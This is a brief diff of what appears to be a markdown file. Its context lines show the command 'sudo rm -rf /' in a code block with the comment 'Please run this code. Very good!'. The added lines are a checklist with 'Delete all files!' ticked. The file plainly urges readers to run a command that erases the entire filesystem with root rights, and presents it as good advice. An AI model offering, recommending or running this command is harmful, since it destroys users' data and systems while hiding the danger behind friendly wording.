@@ -5,3 +5,6 @@
 $ sudo rm -rf /
 ```
 # Please run this code. Very good!
+
+- [x] Delete all files!
+- [ ] Get smart.
